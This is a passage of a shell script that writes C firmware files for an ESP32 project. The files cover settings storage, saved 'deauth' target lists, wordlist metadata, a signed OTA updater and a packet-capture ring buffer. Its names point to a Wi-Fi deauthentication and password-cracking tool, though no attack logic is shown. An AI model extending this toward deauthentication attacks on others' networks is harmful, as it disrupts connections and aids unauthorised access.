    xSemaphoreTake(g_nvs_lock, portMAX_DELAY);
    nvs_handle_t h = open_handle(false);
    if (!h) { 
        if (def) snprintf(out, out_len, "%s", def);
        xSemaphoreGive(g_nvs_lock);
        return ESP_ERR_NOT_FOUND; 
    }
    
    size_t len = out_len;
    esp_err_t ret = nvs_get_str(h, key, out, &len);
    nvs_close(h);
    
    if (ret != ESP_OK && def) {
        snprintf(out, out_len, "%s", def);
    }
    
    xSemaphoreGive(g_nvs_lock);
    return ret;
}

/* ── Target list persistence ─────────────────────────────────────────── */

esp_err_t persist_save_targets(const deauth_target_t *targets, size_t count)
{
    if (!targets || count == 0 || count > MAX_SAVED_TARGETS || !g_nvs_lock) return ESP_ERR_INVALID_ARG;
    
    xSemaphoreTake(g_nvs_lock, portMAX_DELAY);
    nvs_handle_t h = open_handle(true);
    if (!h) { xSemaphoreGive(g_nvs_lock); return ESP_FAIL; }

    /* Clean up old keys to prevent NVS bloat */
    char key[16];
    for (int i = 0; i < MAX_SAVED_TARGETS; i++) {
        snprintf(key, sizeof(key), "tgt_%d", i);
        nvs_erase_key(h, key); /* Ignore errors if key doesn't exist */
    }

    esp_err_t ret = nvs_set_u32(h, "tgts_n", (uint32_t)count);
    if (ret != ESP_OK) { nvs_close(h); xSemaphoreGive(g_nvs_lock); return ret; }

    for (size_t i = 0; i < count; i++) {
        snprintf(key, sizeof(key), "tgt_%d", (int)i);
        ret = nvs_set_blob(h, key, &targets[i], sizeof(deauth_target_t));
        if (ret != ESP_OK) { nvs_close(h); xSemaphoreGive(g_nvs_lock); return ret; }
    }

    ret = nvs_commit(h);
    nvs_close(h);
    xSemaphoreGive(g_nvs_lock);
    return ret;
}

esp_err_t persist_load_targets(deauth_target_t *targets, size_t max, size_t *count)
{
    if (!targets || !count || max == 0 || !g_nvs_lock) return ESP_ERR_INVALID_ARG;
    *count = 0;
    
    xSemaphoreTake(g_nvs_lock, portMAX_DELAY);
    nvs_handle_t h = open_handle(false);
    if (!h) { xSemaphoreGive(g_nvs_lock); return ESP_ERR_NOT_FOUND; }

    uint32_t n = 0;
    esp_err_t ret = nvs_get_u32(h, "tgts_n", &n);
    if (ret != ESP_OK || n == 0) { nvs_close(h); xSemaphoreGive(g_nvs_lock); return ESP_OK; }

    if (n > MAX_SAVED_TARGETS) n = MAX_SAVED_TARGETS;
    if (n > max) n = (uint32_t)max;

    char key[16];
    for (uint32_t i = 0; i < n; i++) {
        snprintf(key, sizeof(key), "tgt_%d", (int)i);
        size_t sz = sizeof(deauth_target_t);
        ret = nvs_get_blob(h, key, &targets[i], &sz);
        if (ret != ESP_OK) { break; }
        (*count)++;
    }

    nvs_close(h);
    xSemaphoreGive(g_nvs_lock);
    return ESP_OK;
}

/* ── Wordlist metadata persistence ───────────────────────────────────── */

esp_err_t persist_save_wordlist_meta(const char *name, size_t count, uint32_t duration_ms)
{
    if (!name || !g_nvs_lock) return ESP_ERR_INVALID_ARG;
    
    xSemaphoreTake(g_nvs_lock, portMAX_DELAY);
    nvs_handle_t h = open_handle(true);
    if (!h) { xSemaphoreGive(g_nvs_lock); return ESP_FAIL; }

    wordlist_meta_t m;
    memset(&m, 0, sizeof(m));
    snprintf(m.name, sizeof(m.name), "%s", name);
    m.count = count;
    m.duration_ms = duration_ms;
    
    esp_err_t ret = nvs_set_blob(h, "wl_meta", &m, sizeof(m));
    if (ret == ESP_OK) ret = nvs_commit(h);
    
    nvs_close(h);
    xSemaphoreGive(g_nvs_lock);
    return ret;
}

esp_err_t persist_load_wordlist_meta(char *name_out, size_t name_sz, size_t *count_out, uint32_t *duration_out)
{
    if (!name_out || !name_sz || !count_out || !duration_out || !g_nvs_lock) return ESP_ERR_INVALID_ARG;
    
    xSemaphoreTake(g_nvs_lock, portMAX_DELAY);
    nvs_handle_t h = open_handle(false);
    if (!h) { xSemaphoreGive(g_nvs_lock); return ESP_ERR_NOT_FOUND; }

    wordlist_meta_t m;
    size_t sz = sizeof(m);
    esp_err_t ret = nvs_get_blob(h, "wl_meta", &m, &sz);
    nvs_close(h);
    
    if (ret == ESP_OK) {
        snprintf(name_out, name_sz, "%s", m.name);
        *count_out = m.count;
        *duration_out = m.duration_ms;
    }
    
    xSemaphoreGive(g_nvs_lock);
    return ret;
}

/* ── Factory reset ───────────────────────────────────────────────────── */

esp_err_t persist_erase_all(void)
{
    if (!g_nvs_lock) return ESP_ERR_INVALID_STATE;
    
    xSemaphoreTake(g_nvs_lock, portMAX_DELAY);
    nvs_handle_t h = open_handle(true);
    if (!h) { xSemaphoreGive(g_nvs_lock); return ESP_FAIL; }
    
    esp_err_t ret = nvs_erase_all(h);
    if (ret == ESP_OK) ret = nvs_commit(h);
    
    nvs_close(h);
    xSemaphoreGive(g_nvs_lock);
    return ret;
}
EOF_REAPER_FILE
echo "  Updated ${TARGET_DIR}/nvs_persist.c"

cat << 'EOF_REAPER_FILE' > "${TARGET_DIR}/nvs_persist.h"
#ifndef NVS_PERSIST_H
#define NVS_PERSIST_H

#include <stdint.h>
#include <stdbool.h>
#include <stddef.h>
#include "esp_err.h"
#include "common_types.h"

#ifdef __cplusplus
extern "C" {
#endif

esp_err_t persist_init(void);
static inline esp_err_t nvs_persist_init(void) { return persist_init(); }

/* Simple settings */
esp_err_t persist_set_u32(const char *key, uint32_t value);
esp_err_t persist_get_u32(const char *key, uint32_t *out, uint32_t def);
esp_err_t persist_set_u8(const char *key, uint8_t value);
esp_err_t persist_get_u8(const char *key, uint8_t *out, uint8_t def);
esp_err_t persist_set_bool(const char *key, bool value);
esp_err_t persist_get_bool(const char *key, bool *out, bool def);
esp_err_t persist_set_str(const char *key, const char *value);
esp_err_t persist_get_str(const char *key, char *out, size_t out_len, const char *def);

/* Target list (array of deauth_target_t) */
esp_err_t persist_save_targets(const deauth_target_t *targets, size_t count);
esp_err_t persist_load_targets(deauth_target_t *targets, size_t max, size_t *count);

/* Wordlist metadata */
esp_err_t persist_save_wordlist_meta(const char *name, size_t count, uint32_t duration_ms);
esp_err_t persist_load_wordlist_meta(char *name_out, size_t name_sz, size_t *count_out, uint32_t *duration_out);

/* Reset */
esp_err_t persist_erase_all(void);

#ifdef __cplusplus
}
#endif

#endif // NVS_PERSIST_H
EOF_REAPER_FILE
echo "  Updated ${TARGET_DIR}/nvs_persist.h"

cat << 'EOF_REAPER_FILE' > "${TARGET_DIR}/ota_http.c"
/*
 * ============================================================================
 *  ota_http.c  —  HTTP firmware update with RSA-2048 / SHA-256 signature check
 * ============================================================================
 */

#include "ota_http.h"

#include <string.h>
#include <stdatomic.h>
#include <stdio.h>
#include <stdlib.h>

#include "esp_ota_ops.h"
#include "esp_partition.h"
#include "esp_http_client.h"
#include "esp_system.h"
#include "esp_log.h"
#include "esp_timer.h"
#include "esp_heap_caps.h"

#if __has_include("psa/crypto.h")
#include "psa/crypto.h"
#endif
#if __has_include("mbedtls/pk.h")
#include "mbedtls/pk.h"
#endif
#if __has_include("mbedtls/md.h")
#include "mbedtls/md.h"
#endif

#include "freertos/FreeRTOS.h"
#include "freertos/task.h"

static const char *TAG = "ota";

/* State */
static atomic_bool g_ota_running = ATOMIC_VAR_INIT(false);
static atomic_int  g_ota_progress = ATOMIC_VAR_INIT(-1);

#define DL_CHUNK 4096
#define OTA_TASK_STACK_SIZE 8192

typedef struct {
    char url[256];
    uint8_t *pubkey_der;
    size_t pubkey_len;
} ota_task_params_t;

/* -------------------------------------------------------------------------
 *  Signature Verification (mbedTLS v3.x compatible)
 * ----------------------------------------------------------------------- */

static inline uint32_t ota_rotr32(uint32_t x, uint32_t n)
{
    return (x >> n) | (x << (32U - n));
}

static void ota_sha256(const uint8_t *data, size_t len, uint8_t digest[32])
{
    static const uint32_t k[64] = {
        0x428a2f98UL, 0x71374491UL, 0xb5c0fbcfUL, 0xe9b5dba5UL,
        0x3956c25bUL, 0x59f111f1UL, 0x923f82a4UL, 0xab1c5ed5UL,
        0xd807aa98UL, 0x12835b01UL, 0x243185beUL, 0x550c7dc3UL,
        0x72be5d74UL, 0x80deb1feUL, 0x9bdc06a7UL, 0xc19bf174UL,
        0xe49b69c1UL, 0xefbe4786UL, 0x0fc19dc6UL, 0x240ca1ccUL,
        0x2de92c6fUL, 0x4a7484aaUL, 0x5cb0a9dcUL, 0x76f988daUL,
        0x983e5152UL, 0xa831c66dUL, 0xb00327c8UL, 0xbf597fc7UL,
        0xc6e00bf3UL, 0xd5a79147UL, 0x06ca6351UL, 0x14292967UL,
        0x27b70a85UL, 0x2e1b2138UL, 0x4d2c6dfcUL, 0x53380d13UL,
        0x650a7354UL, 0x766a0abbUL, 0x81c2c92eUL, 0x92722c85UL,
        0xa2bfe8a1UL, 0xa81a664bUL, 0xc24b8b70UL, 0xc76c51a3UL,
        0xd192e819UL, 0xd6990624UL, 0xf40e3585UL, 0x106aa070UL,
        0x19a4c116UL, 0x1e376c08UL, 0x2748774cUL, 0x34b0bcb5UL,
        0x391c0cb3UL, 0x4ed8aa4aUL, 0x5b9cca4fUL, 0x682e6ff3UL,
        0x748f82eeUL, 0x78a5636fUL, 0x84c87814UL, 0x8cc70208UL,
        0x90befffaUL, 0xa4506cebUL, 0xbef9a3f7UL, 0xc67178f2UL
    };

    uint32_t state[8] = {
        0x6a09e667UL, 0xbb67ae85UL, 0x3c6ef372UL, 0xa54ff53aUL,
        0x510e527fUL, 0x9b05688cUL, 0x1f83d9abUL, 0x5be0cd19UL
    };

    uint64_t bitlen = (uint64_t)len * 8ULL;
    size_t offset = 0;

    while (offset + 64 <= len) {
        uint32_t w[64];
        const uint8_t *blk = data + offset;
        for (int i = 0; i < 16; i++) {
            w[i] = ((uint32_t)blk[i * 4 + 0] << 24) |
                   ((uint32_t)blk[i * 4 + 1] << 16) |
                   ((uint32_t)blk[i * 4 + 2] << 8)  |
                   ((uint32_t)blk[i * 4 + 3]);
        }
        for (int i = 16; i < 64; i++) {
            uint32_t s0 = ota_rotr32(w[i - 15], 7) ^ ota_rotr32(w[i - 15], 18) ^ (w[i - 15] >> 3);
            uint32_t s1 = ota_rotr32(w[i - 2], 17) ^ ota_rotr32(w[i - 2], 19) ^ (w[i - 2] >> 10);
            w[i] = w[i - 16] + s0 + w[i - 7] + s1;
        }
        uint32_t a = state[0], b = state[1], c = state[2], d = state[3];
        uint32_t e = state[4], f = state[5], g = state[6], h = state[7];
        for (int i = 0; i < 64; i++) {
            uint32_t S1 = ota_rotr32(e, 6) ^ ota_rotr32(e, 11) ^ ota_rotr32(e, 25);
            uint32_t ch = (e & f) ^ ((~e) & g);
            uint32_t t1 = h + S1 + ch + k[i] + w[i];
            uint32_t S0 = ota_rotr32(a, 2) ^ ota_rotr32(a, 13) ^ ota_rotr32(a, 22);
            uint32_t maj = (a & b) ^ (a & c) ^ (b & c);
            uint32_t t2 = S0 + maj;
            h = g; g = f; f = e; e = d + t1;
            d = c; c = b; b = a; a = t1 + t2;
        }
        state[0] += a; state[1] += b; state[2] += c; state[3] += d;
        state[4] += e; state[5] += f; state[6] += g; state[7] += h;
        offset += 64;
    }

    uint8_t tail[128];
    memset(tail, 0, sizeof(tail));
    size_t rem = len - offset;
    if (rem > 0) {
        memcpy(tail, data + offset, rem);
    }
    tail[rem] = 0x80U;
    size_t total_tail = (rem < 56) ? 64 : 128;
    for (int i = 0; i < 8; i++) {
        tail[total_tail - 8 + i] = (uint8_t)(bitlen >> ((7 - i) * 8));
    }

    for (size_t b_off = 0; b_off < total_tail; b_off += 64) {
        uint32_t w[64];
        const uint8_t *blk = tail + b_off;
        for (int i = 0; i < 16; i++) {
            w[i] = ((uint32_t)blk[i * 4 + 0] << 24) |
                   ((uint32_t)blk[i * 4 + 1] << 16) |
                   ((uint32_t)blk[i * 4 + 2] << 8)  |
                   ((uint32_t)blk[i * 4 + 3]);
        }
        for (int i = 16; i < 64; i++) {
            uint32_t s0 = ota_rotr32(w[i - 15], 7) ^ ota_rotr32(w[i - 15], 18) ^ (w[i - 15] >> 3);
            uint32_t s1 = ota_rotr32(w[i - 2], 17) ^ ota_rotr32(w[i - 2], 19) ^ (w[i - 2] >> 10);
            w[i] = w[i - 16] + s0 + w[i - 7] + s1;
        }
        uint32_t a = state[0], b = state[1], c = state[2], d = state[3];
        uint32_t e = state[4], f = state[5], g = state[6], h = state[7];
        for (int i = 0; i < 64; i++) {
            uint32_t S1 = ota_rotr32(e, 6) ^ ota_rotr32(e, 11) ^ ota_rotr32(e, 25);
            uint32_t ch = (e & f) ^ ((~e) & g);
            uint32_t t1 = h + S1 + ch + k[i] + w[i];
            uint32_t S0 = ota_rotr32(a, 2) ^ ota_rotr32(a, 13) ^ ota_rotr32(a, 22);
            uint32_t maj = (a & b) ^ (a & c) ^ (b & c);
            uint32_t t2 = S0 + maj;
            h = g; g = f; f = e; e = d + t1;
            d = c; c = b; b = a; a = t1 + t2;
        }
        state[0] += a; state[1] += b; state[2] += c; state[3] += d;
        state[4] += e; state[5] += f; state[6] += g; state[7] += h;
    }

    for (int i = 0; i < 8; i++) {
        digest[i * 4 + 0] = (uint8_t)(state[i] >> 24);
        digest[i * 4 + 1] = (uint8_t)(state[i] >> 16);
        digest[i * 4 + 2] = (uint8_t)(state[i] >> 8);
        digest[i * 4 + 3] = (uint8_t)(state[i]);
    }
}

static esp_err_t verify_signature(const uint8_t *fw, size_t fw_len,
                                  const uint8_t *sig, size_t sig_len,
                                  const uint8_t *pubkey_der, size_t pk_len)
{
    uint8_t hash[32];
    ota_sha256(fw, fw_len, hash);

#if __has_include("psa/crypto.h")
    (void)psa_crypto_init();
#endif

#if __has_include("mbedtls/pk.h")
    mbedtls_pk_context pk;
    mbedtls_pk_init(&pk);

    int ret = mbedtls_pk_parse_public_key(&pk, pubkey_der, pk_len);
    if (ret != 0) {
        ESP_LOGE(TAG, "Public key parse failed: -0x%04x", (unsigned)(-ret));
        mbedtls_pk_free(&pk);
        return ESP_ERR_INVALID_STATE;
    }

    ret = mbedtls_pk_verify(&pk, MBEDTLS_MD_SHA256, hash, sizeof(hash), sig, sig_len);
    if (ret != 0) {
        ESP_LOGE(TAG, "RSA verify failed: -0x%04x", (unsigned)(-ret));
        mbedtls_pk_free(&pk);
        return ESP_ERR_INVALID_STATE;
    }

    ESP_LOGI(TAG, "Firmware signature verified");
    mbedtls_pk_free(&pk);
    return ESP_OK;
#else
    (void)sig; (void)sig_len; (void)pubkey_der; (void)pk_len;
    return ESP_ERR_NOT_SUPPORTED;
#endif
}

/* -------------------------------------------------------------------------
 *  Background OTA Task
 * ----------------------------------------------------------------------- */

static void ota_task(void *arg)
{
    ota_task_params_t *params = (ota_task_params_t *)arg;
    const char *url = params->url;
    const uint8_t *pubkey_der = params->pubkey_der;
    size_t pubkey_len = params->pubkey_len;

    ota_status_t final_status = OTA_OK;

    const esp_partition_t *upd = esp_ota_get_next_update_partition(NULL);
    if (!upd) {
        ESP_LOGE(TAG, "No OTA partition available");
        final_status = OTA_ERR_NO_SLOT;
        goto cleanup;
    }

    ESP_LOGI(TAG, "OTA target partition: %s @ 0x%x (%u bytes)",
             upd->label, (unsigned)upd->address, (unsigned)upd->size);

    /* HTTP client config */
    esp_http_client_config_t httpcfg = {
        .url = url,
        .timeout_ms = 30000,
        .keep_alive_enable = false,
        .disable_auto_redirect = true,
    };

    esp_http_client_handle_t client = esp_http_client_init(&httpcfg);
    if (!client) {
        ESP_LOGE(TAG, "HTTP client init failed");
        final_status = OTA_ERR_DOWNLOAD;
        goto cleanup;
    }

    esp_err_t err = esp_http_client_open(client, 0);
    if (err != ESP_OK) {
        ESP_LOGE(TAG, "HTTP open failed: %s", esp_err_to_name(err));
        esp_http_client_cleanup(client);
        final_status = OTA_ERR_DOWNLOAD;
        goto cleanup;
    }

    /* CRITICAL: Must fetch headers to get status code and content length */
    int content_len = esp_http_client_fetch_headers(client);
    int status = esp_http_client_get_status_code(client);
    
    if (status != 200) {
        ESP_LOGE(TAG, "HTTP %d", status);
        esp_http_client_close(client);
        esp_http_client_cleanup(client);
        final_status = OTA_ERR_DOWNLOAD;
        goto cleanup;
    }

    if (content_len <= 0) {
        ESP_LOGE(TAG, "Missing or invalid Content-Length");
        esp_http_client_close(client);
        esp_http_client_cleanup(client);
        final_status = OTA_ERR_DOWNLOAD;
        goto cleanup;
    }

    ESP_LOGI(TAG, "Firmware size: %d bytes", content_len);

    /* Allocate buffer STRICTLY in PSRAM. Internal RAM is too small for firmware. */
    uint8_t *fw_buf = heap_caps_malloc(content_len, MALLOC_CAP_SPIRAM | MALLOC_CAP_8BIT);
    if (!fw_buf) {
        ESP_LOGE(TAG, "No PSRAM available for firmware buffer");
        esp_http_client_close(client);
        esp_http_client_cleanup(client);
        final_status = OTA_ERR_NO_PSRAM;
        goto cleanup;
    }

    /* Download */
    int total = 0;
    while (total < content_len) {
        if (!atomic_load(&g_ota_running)) {
            ESP_LOGW(TAG, "OTA aborted by user");
            heap_caps_free(fw_buf);
            esp_http_client_close(client);
            esp_http_client_cleanup(client);
            final_status = OTA_ERR_DOWNLOAD;
            goto cleanup;
        }

        int rd = esp_http_client_read(client, (char *)(fw_buf + total), content_len - total);
        if (rd <= 0) {
            ESP_LOGE(TAG, "Download stopped at %d/%d", total, content_len);
            heap_caps_free(fw_buf);
            esp_http_client_close(client);
            esp_http_client_cleanup(client);
            final_status = OTA_ERR_DOWNLOAD;
            goto cleanup;
        }
        total += rd;
        atomic_store(&g_ota_progress, (total * 100) / content_len);
    }

    esp_http_client_close(client);
    esp_http_client_cleanup(client);
    ESP_LOGI(TAG, "Download complete: %d bytes", total);

    /* Read signature: expect URL + ".sig" */
    char sig_url[280];
    snprintf(sig_url, sizeof(sig_url), "%s.sig", url);

    uint8_t sig[512];
    int sig_len = 0;

    esp_http_client_config_t scfg = {
        .url = sig_url,
        .timeout_ms = 10000,
        .disable_auto_redirect = true,
    };
    esp_http_client_handle_t sc = esp_http_client_init(&scfg);
    if (sc) {
        if (esp_http_client_open(sc, 0) == ESP_OK) {
            int sig_content_len = esp_http_client_fetch_headers(sc);
            if (esp_http_client_get_status_code(sc) == 200 && sig_content_len > 0 && (size_t)sig_content_len <= sizeof(sig)) {
                sig_len = esp_http_client_read(sc, (char *)sig, sig_content_len);
                if (sig_len < 0) sig_len = 0;
            }
        }
        esp_http_client_close(sc);
        esp_http_client_cleanup(sc);
    }

    if (sig_len == 0) {
        ESP_LOGE(TAG, "Signature fetch failed");
        heap_caps_free(fw_buf);
        final_status = OTA_ERR_VERIFY;
        goto cleanup;
    }

    ESP_LOGI(TAG, "Signature size: %d bytes", sig_len);

    /* Verify */
    if (verify_signature(fw_buf, total, sig, sig_len, pubkey_der, pubkey_len) != ESP_OK) {
        heap_caps_free(fw_buf);
        final_status = OTA_ERR_VERIFY;
        goto cleanup;
    }

    /* Write verified image into OTA partition (Modern ESP-IDF API) */
    esp_ota_handle_t ota_handle;
    esp_err_t ret = esp_ota_begin(upd, total, &ota_handle);
    if (ret != ESP_OK) {
        ESP_LOGE(TAG, "OTA begin failed: %s", esp_err_to_name(ret));
        heap_caps_free(fw_buf);
        final_status = OTA_ERR_WRITE;
        goto cleanup;
    }

    ret = esp_ota_write(ota_handle, fw_buf, total);
    heap_caps_free(fw_buf);

    if (ret != ESP_OK) {
        ESP_LOGE(TAG, "OTA write failed: %s", esp_err_to_name(ret));
        esp_ota_end(ota_handle);
        final_status = OTA_ERR_WRITE;
        goto cleanup;
    }

    ret = esp_ota_end(ota_handle);
    if (ret != ESP_OK) {
        ESP_LOGE(TAG, "OTA end failed: %s", esp_err_to_name(ret));
        final_status = OTA_ERR_WRITE;
        goto cleanup;
    }

    ret = esp_ota_set_boot_partition(upd);
    if (ret != ESP_OK) {
        ESP_LOGE(TAG, "Set boot partition failed: %s", esp_err_to_name(ret));
        final_status = OTA_ERR_BOOT;
        goto cleanup;
    }

    ESP_LOGI(TAG, "OTA complete — rebooting");
    atomic_store(&g_ota_progress, 100);
    
    /* Give logs a moment to flush before reboot */
    vTaskDelay(pdMS_TO_TICKS(500)); 
    esp_restart();

cleanup:
    atomic_store(&g_ota_running, false);
    atomic_store(&g_ota_progress, -1);
    
    if (final_status != OTA_OK) {
        ESP_LOGE(TAG, "OTA failed with status: %d", final_status);
    }
    
    free(params->pubkey_der);
    free(params);
    vTaskDelete(NULL);
}

/* -------------------------------------------------------------------------
 *  Public API
 * ----------------------------------------------------------------------- */

esp_err_t ota_http_init(void)
{
    atomic_store(&g_ota_running, false);
    atomic_store(&g_ota_progress, -1);
    ESP_LOGI(TAG, "OTA HTTP module ready");
    return ESP_OK;
}

ota_status_t ota_http_start(const char *url, const uint8_t *pubkey_der, size_t pubkey_len)
{
    if (!url || !pubkey_der || pubkey_len == 0) return OTA_ERR_INVALID_ARG;
    
    if (atomic_load(&g_ota_running)) {
        return OTA_ERR_NOT_READY;
    }

    /* Allocate parameters for the background task */
    ota_task_params_t *params = calloc(1, sizeof(ota_task_params_t));
    if (!params) return OTA_ERR_DOWNLOAD;

    snprintf(params->url, sizeof(params->url), "%s", url);
    params->pubkey_len = pubkey_len;
    params->pubkey_der = malloc(pubkey_len);
    
    if (!params->pubkey_der) {
        free(params);
        return OTA_ERR_DOWNLOAD;
    }
    memcpy(params->pubkey_der, pubkey_der, pubkey_len);

    atomic_store(&g_ota_running, true);
    atomic_store(&g_ota_progress, 0);

    /* Spawn background task so we don't block the CLI/JSON-RPC thread */
    BaseType_t ret = xTaskCreate(ota_task, "ota_task", OTA_TASK_STACK_SIZE, 
                                 params, 5, NULL);
                                 
    if (ret != pdPASS) {
        ESP_LOGE(TAG, "Failed to create OTA task");
        free(params->pubkey_der);
        free(params);
        atomic_store(&g_ota_running, false);
        atomic_store(&g_ota_progress, -1);
        return OTA_ERR_DOWNLOAD;
    }

    return OTA_OK;
}

void ota_http_abort(void)
{
    if (atomic_load(&g_ota_running)) {
        atomic_store(&g_ota_running, false);
        atomic_store(&g_ota_progress, -1);
        ESP_LOGW(TAG, "OTA abort requested");
    }
}

bool ota_http_in_progress(void)
{
    return atomic_load(&g_ota_running);
}

int ota_http_progress(void)
{
    return atomic_load(&g_ota_progress);
}
EOF_REAPER_FILE
echo "  Updated ${TARGET_DIR}/ota_http.c"

cat << 'EOF_REAPER_FILE' > "${TARGET_DIR}/pcap_ring.c"
/*
 * ============================================================================
 *  pcap_ring.c  —  Circular PCAP capture buffer with binary framing
 * ============================================================================
 *
 * Frame layout:
 *
 *   [uint32_t total_len][uint32_t crc32][pcaprec_hdr_t][payload]
 *
 * total_len includes the entire frame:
 *
 *   total_len = 4 + 4 + sizeof(pcaprec_hdr_t) + payload_len
 *
 * CRC32 is computed over:
 *
 *   pcaprec_hdr_t + payload
 */

#include <string.h>
#include <stdint.h>
#include <stdio.h>
#include <stdatomic.h>
#include <sys/time.h>

#include "freertos/FreeRTOS.h"
#include "freertos/semphr.h"

#include "esp_heap_caps.h"
#include "esp_log.h"
#include "esp_system.h"

#include "pcap_ring.h"
#include "storage_sd.h"

static const char *TAG = "pcap_ring";

#define PCAP_RING_DEFAULT_SIZE      (2u * 1024u * 1024u)
#define PCAP_EXPORT_CHUNK_SIZE      256u

#ifndef ESP_ERR_INVALID_CRC
#define ESP_ERR_INVALID_CRC ESP_ERR_INVALID_ARG
#endif

static uint8_t *g_pcap_ring_buf = NULL;
static size_t g_pcap_ring_capacity = 0;
static size_t g_pcap_ring_used = 0;
static size_t g_pcap_ring_head = 0;
static size_t g_pcap_ring_tail = 0;

static atomic_bool g_pcap_ring_active = ATOMIC_VAR_INIT(false);

static uint32_t g_pcap_ring_packets = 0;
static uint32_t g_pcap_ring_dropped_packets = 0;
static uint32_t g_pcap_ring_dropped_bytes = 0;

static SemaphoreHandle_t g_pcap_ring_mutex = NULL;

/* -------------------------------------------------------------------------
 *  CRC32
 * ----------------------------------------------------------------------- */

static uint32_t crc32_update_raw(uint32_t crc, const uint8_t *buf, size_t len)
{
    if (buf == NULL || len == 0) {
        return crc;
    }

    for (size_t i = 0; i < len; i++) {
        crc ^= (uint32_t)buf[i];

        for (int j = 0; j < 8; j++) {
            if (crc & 1u) {
                crc = (crc >> 1) ^ 0xEDB88320u;
            } else {
                crc >>= 1;
            }
        }
    }

    return crc;
}

uint32_t pcap_ring_frame_crc32(const uint8_t *buf, size_t len)
{
    if (buf == NULL || len == 0) {
        return 0;
    }

    uint32_t crc = 0xFFFFFFFFu;
    crc = crc32_update_raw(crc, buf, len);
    return crc ^ 0xFFFFFFFFu;
}

static void pcap_ring_read_bytes_at(size_t offset, uint8_t *dst, size_t len);

static uint32_t crc32_ring(size_t offset, size_t len)
{
    uint8_t chunk[PCAP_EXPORT_CHUNK_SIZE];
    uint32_t crc = 0xFFFFFFFFu;

    size_t done = 0;

    while (done < len) {
        size_t n = len - done;
        if (n > sizeof(chunk)) {
            n = sizeof(chunk);
        }

        pcap_ring_read_bytes_at(offset + done, chunk, n);
        crc = crc32_update_raw(crc, chunk, n);

        done += n;
    }

    return crc ^ 0xFFFFFFFFu;
}

/* -------------------------------------------------------------------------
 *  Ring primitives
 * ----------------------------------------------------------------------- */

static void pcap_ring_write_bytes(const uint8_t *src, size_t len)
{
    if (g_pcap_ring_buf == NULL || g_pcap_ring_capacity == 0 ||
        src == NULL || len == 0) {
        return;
    }

    size_t first = (g_pcap_ring_capacity - g_pcap_ring_tail < len)
                       ? (g_pcap_ring_capacity - g_pcap_ring_tail)
                       : len;

    if (first > 0) {
        memcpy(g_pcap_ring_buf + g_pcap_ring_tail, src, first);
    }

    if (len > first) {
        memcpy(g_pcap_ring_buf, src + first, len - first);
    }

    g_pcap_ring_tail = (g_pcap_ring_tail + len) % g_pcap_ring_capacity;
}

static void pcap_ring_write_u32(uint32_t v)
{
    uint8_t bytes[4] = {
        (uint8_t)(v & 0xFFu),
        (uint8_t)((v >> 8) & 0xFFu),
        (uint8_t)((v >> 16) & 0xFFu),
        (uint8_t)((v >> 24) & 0xFFu),
    };

    pcap_ring_write_bytes(bytes, sizeof(bytes));
}

static void pcap_ring_read_bytes_at(size_t offset, uint8_t *dst, size_t len)
{
    if (g_pcap_ring_buf == NULL || g_pcap_ring_capacity == 0 ||
        dst == NULL || len == 0) {
        return;
    }

    offset %= g_pcap_ring_capacity;

    size_t first = (g_pcap_ring_capacity - offset < len)
                       ? (g_pcap_ring_capacity - offset)
                       : len;

    if (first > 0) {
        memcpy(dst, g_pcap_ring_buf + offset, first);
    }

    if (len > first) {
        memcpy(dst + first, g_pcap_ring_buf, len - first);
    }
}

static uint32_t pcap_ring_read_u32_at(size_t offset)
{
    if (g_pcap_ring_buf == NULL || g_pcap_ring_capacity == 0) {
        return 0;
    }

    uint8_t bytes[4] = {0};
    pcap_ring_read_bytes_at(offset, bytes, sizeof(bytes));

    return ((uint32_t)bytes[0]) |
           ((uint32_t)bytes[1] << 8) |
           ((uint32_t)bytes[2] << 16) |
           ((uint32_t)bytes[3] << 24);
}

static void pcap_ring_reset_counters_locked(void)
{
    g_pcap_ring_used = 0;
    g_pcap_ring_head = 0;
    g_pcap_ring_tail = 0;
    g_pcap_ring_packets = 0;
    g_pcap_ring_dropped_packets = 0;
    g_pcap_ring_dropped_bytes = 0;
}

/* -------------------------------------------------------------------------
 *  Space management
 * ----------------------------------------------------------------------- */

static bool pcap_ring_make_room(size_t needed)
{
    if (g_pcap_ring_buf == NULL || g_pcap_ring_capacity == 0) {
        return false;
    }

    if (needed > g_pcap_ring_capacity) {
        return false;
    }

    while (g_pcap_ring_used + needed > g_pcap_ring_capacity &&
           g_pcap_ring_used > 0) {

        uint32_t total_len = pcap_ring_read_u32_at(g_pcap_ring_head);

        if (total_len < PCAP_FRAME_MIN_LEN ||
            total_len > g_pcap_ring_used ||
            total_len > g_pcap_ring_capacity) {

            ESP_LOGW(TAG, "Ring corruption detected; wiping ring");

            g_pcap_ring_dropped_bytes += (uint32_t)g_pcap_ring_used;
            g_pcap_ring_dropped_packets++;

            g_pcap_ring_head = 0;
            g_pcap_ring_tail = 0;
            g_pcap_ring_used = 0;
            break;
        }

        g_pcap_ring_head = (g_pcap_ring_head + total_len) % g_pcap_ring_capacity;
        g_pcap_ring_used -= total_len;

        g_pcap_ring_dropped_packets++;
        g_pcap_ring_dropped_bytes += total_len;
    }

    return g_pcap_ring_used + needed <= g_pcap_ring_capacity;
}

/* -------------------------------------------------------------------------
 *  Frame helpers
 * ----------------------------------------------------------------------- */

esp_err_t pcap_ring_build_frame(uint8_t *out, size_t out_sz,
                                const uint8_t *payload, size_t payload_len,
                                const struct timeval *tv)
{
    if (out == NULL || out_sz == 0 ||
        payload == NULL || payload_len == 0 ||
        tv == NULL) {
        return ESP_ERR_INVALID_ARG;
    }

    if (payload_len > PCAP_RING_MAX_PAYLOAD) {
        return ESP_ERR_INVALID_SIZE;
    }

    size_t total_len = sizeof(uint32_t) +
                       sizeof(uint32_t) +
                       sizeof(pcaprec_hdr_t) +
                       payload_len;

    if (total_len > out_sz) {
        return ESP_ERR_NO_MEM;
    }

    pcaprec_hdr_t rec = {
        .ts_sec = (uint32_t)tv->tv_sec,
        .ts_usec = (uint32_t)tv->tv_usec,
        .incl_len = (uint32_t)payload_len,
        .orig_len = (uint32_t)payload_len,
    };

    /* total_len */
    out[0] = (uint8_t)(total_len & 0xFFu);
    out[1] = (uint8_t)((total_len >> 8) & 0xFFu);
    out[2] = (uint8_t)((total_len >> 16) & 0xFFu);
    out[3] = (uint8_t)((total_len >> 24) & 0xFFu);

    /* pcap record + payload */
    memcpy(out + PCAP_FRAME_HDR_OFFSET, &rec, sizeof(rec));
    memcpy(out + PCAP_FRAME_HDR_OFFSET + sizeof(rec), payload, payload_len);

    /* CRC over record + payload */
    uint32_t crc = pcap_ring_frame_crc32(out + PCAP_FRAME_HDR_OFFSET,
